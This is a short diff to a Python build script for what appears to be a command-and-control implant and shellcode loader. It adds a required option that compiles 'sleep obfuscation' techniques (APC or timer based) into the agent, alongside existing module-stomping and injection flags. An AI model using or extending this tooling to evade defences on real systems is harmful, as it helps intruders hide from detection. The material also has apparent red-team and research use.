@@ -96,7 +96,7 @@ def compile_loader( ldr_output, stomp=False):
         print(result.stderr)  # Print error output
         return False
 
-def compile_agent(agent_bkapi, stomp=False):
+def compile_agent(agent_bkapi, sleep_technique, stomp=False):
     """Compiles the agent from the source files and assembly code."""
     CFLAGS = "-Os -fno-asynchronous-unwind-tables -nostdlib "
     CFLAGS += "-fno-ident -fpack-struct=8 -falign-functions=1 "
@@ -109,8 +109,12 @@ def compile_agent(agent_bkapi, stomp=False):
         CFLAGS += f"-D{agent_bkapi} "
     
     if stomp:
-        # Add BK_STOMP for the agent when --stomp is used
         CFLAGS += "-DBK_STOMP "
+
+    if sleep_technique == "apc":
+        CFLAGS += "-D_BK_SLEEP_OBF_=0x2030 "
+    if sleep_technique == "timer":
+        CFLAGS += "-D_BK_SLEEP_OBF_=0x1030 "
 
     BLACK_SRC  = "agent/src/*.c"
     BLACK_COM  = "agent/src/communication/*.c"
@@ -163,13 +167,14 @@ def main():
     parser.add_argument("--section", help="Define the section for the loader.")
     parser.add_argument("--agent-bkapi", help="Define agent BKAPI input for the -D option.")
     parser.add_argument("--stomp", action='store_true', help="Add -D BK_STOMP and -D INJECTION_STOMPER to agent and loader compilation.")
+    parser.add_argument("--obf", required=True, help="Define your sleep obfuscation technique, options: | \"apc\" | \"timer\".")
 
     args = parser.parse_args()
     ldr_output = f"bin/{args.output}"
 
     clean_bin_folder()
 
-    if compile_agent(args.agent_bkapi, stomp=args.stomp):
+    if compile_agent(args.agent_bkapi, stomp=args.stomp, sleep_technique=args.obf):
         extract_shellcode()
         generate_shellcode_header("bin/blackout.x64.bin", "loader/include/shellcode.h", args.section)
         
